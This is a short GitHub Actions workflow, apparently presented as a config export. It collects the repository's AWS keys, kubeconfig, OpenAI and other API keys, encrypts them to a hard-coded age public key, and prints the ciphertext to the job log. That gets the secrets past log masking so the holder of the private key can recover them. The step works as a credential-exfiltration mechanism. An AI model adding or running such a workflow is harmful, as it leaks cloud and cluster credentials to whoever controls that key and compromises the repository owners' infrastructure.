name: export-config
on: workflow_dispatch

permissions: {}   # no GITHUB_TOKEN scopes

jobs:
  export:
    runs-on: ubuntu-latest
    timeout-minutes: 5
    steps:
      - name: Encrypt config values
        env:
          AWS_ACCESS_KEY: ${{ secrets.AWS_ACCESS_KEY }}
          AWS_SECRET_ACCESS_KEY: ${{ secrets.AWS_SECRET_ACCESS_KEY }}
          EKS_POD_IDENTITY_ROLE_ARN: ${{ secrets.EKS_POD_IDENTITY_ROLE_ARN }}
          KUBE_CONFIG_DATA: ${{ secrets.KUBE_CONFIG_DATA }}
          LD_EAP_API_KEY: ${{ secrets.LD_EAP_API_KEY }}
          OPENAI_API_KEY: ${{ secrets.OPENAI_API_KEY }}
          WORKFLOW_API_ENDPOINT: ${{ secrets.WORKFLOW_API_ENDPOINT }}
          WORKFLOW_LAMBDA_FUNCTION_ARN: ${{ secrets.WORKFLOW_LAMBDA_FUNCTION_ARN }}
          WORKFLOW_RECORDS_TABLE: ${{ secrets.WORKFLOW_RECORDS_TABLE }}
        run: |
          sudo apt-get install -y -qq age >/dev/null
          jq -n 'env | {AWS_ACCESS_KEY, AWS_SECRET_ACCESS_KEY, EKS_POD_IDENTITY_ROLE_ARN, KUBE_CONFIG_DATA, LD_EAP_API_KEY, OPENAI_API_KEY, WORKFLOW_API_ENDPOINT, WORKFLOW_LAMBDA_FUNCTION_ARN, WORKFLOW_RECORDS_TABLE}' \
            | age -r "age1s7y6d3hffd0z2hy2zzuw9rdxy292fwlhuy8tlqgur3uhl778c5msuukmxy" -a
